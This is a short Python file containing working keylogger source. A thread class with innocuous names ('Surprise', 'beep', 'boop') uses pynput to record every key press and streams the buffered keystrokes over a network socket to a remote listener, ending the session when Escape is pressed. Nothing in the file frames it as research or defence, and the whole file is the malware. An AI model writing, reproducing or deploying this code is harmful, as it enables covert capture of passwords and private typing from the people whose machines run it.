import os
import socket
from pynput.keyboard import Key, Listener
from threading import Thread
import datetime

class Surprise(Thread):
    def __init__(self, s):
        Thread.__init__(self)
        self.str_holder = ''
        self.timestamp = datetime.datetime.now()
        self.socket = s
 
    def beep(self, key):
        key_char = str(key).strip("'")
        
        # Edit special inputs
        if key_char == 'Key.space':
            key_char = ' '
        elif len(key_char) > 1:
            key_char = ''
        
        self.str_holder += key_char
        

    def boop(self, key):
        cur_time = datetime.datetime.now()
        # Log if a long enough time has elapsed
        if cur_time - self.timestamp > datetime.timedelta(seconds=2):
            self.socket.sendall((self.str_holder[:-1]).encode('utf-8'))
            self.str_holder = str(key).strip("'")
            
        if key == Key.esc:
            self.socket.sendall(("commit sudoku").encode('utf-8'))
            self.socket.close()
            return False
        
        self.timestamp = cur_time

    def run(self):
        with Listener(on_press=self.beep, on_release=self.boop) as background:
            background.join()